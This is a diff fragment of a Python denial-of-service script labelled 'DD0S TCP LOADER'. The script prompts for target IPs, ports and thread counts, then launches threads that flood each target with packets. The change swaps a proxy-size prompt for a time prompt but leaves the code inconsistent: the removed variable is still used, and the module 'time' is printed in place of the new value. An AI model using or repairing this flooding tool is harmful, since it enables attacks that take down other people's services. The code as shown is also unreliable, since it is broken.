@@ -66,7 +66,7 @@ def send_packets(ip, port, data, proxy_size):
 # Type your ip and port number (find IP address using nslookup or any online website)
 ips = input("IP Targets : ").split(',')
 ports = input("Ports : ").split(',')
-proxy_size = int(input("Proxy Size : "))
+times = int(input("Time : "))
 threads = int(input("Number of threads : "))
 time.sleep(5),
 print("\033[96m                  ⟩⟩  DD0S TCP LOADER \033[0m "),
@@ -85,7 +85,7 @@ for ip in ips:
     for port in ports:
         # Use a bytes literal to create the data
         data = b'Hello, this is a DDOS attack'
-        print("Starting the attack on ", ip, " at port ", port, " with a proxy size of ", proxy_size, "...")
+        print("Starting the attack on ", ip, " at port ", port, " with a times ", time, "...")
         for i in range(threads):
             t = threading.Thread(target=send_packets, args=(ip, int(port), data, proxy_size))
             t.start()           
